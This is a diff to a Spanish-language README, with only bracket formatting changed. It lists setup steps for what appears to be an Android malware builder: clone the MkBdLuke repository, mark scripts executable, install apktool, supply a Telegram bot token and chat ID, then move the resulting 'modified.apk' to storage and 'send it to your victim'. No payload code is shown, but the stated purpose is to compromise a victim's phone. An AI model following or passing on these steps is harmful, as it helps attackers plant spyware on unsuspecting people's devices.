@@ -22,15 +22,15 @@ Pasos:
 
 3️⃣ Descarga el repositorio en termux o Linux en la terminal.
 
-[] (git clone https://github.com/Luke-Galaxy/MkBdLuke)
+[ ] (git clone https://github.com/Luke-Galaxy/MkBdLuke)
 
 4️⃣ Entra en el repositorio y dale permisos de ejecución.
 
-[] (cd MkBdLuke && chmod *.sh)
+[ ] (cd MkBdLuke && chmod *.sh)
 
 5️⃣ Instala apktool
 
-[] (bash apktool.sh)
+[ ] (bash apktool.sh)
 
 7️⃣ Inserta tu chat 🆔 y tu token del bot de telegram.
 
@@ -40,4 +40,4 @@ Pasos:
 
 🔟 Muévela al almacenamiento interno y ¡envíala a tu víctima!
 
-[] (mv modified.apk /sdcard/)
+[ ] (mv modified.apk /sdcard/)
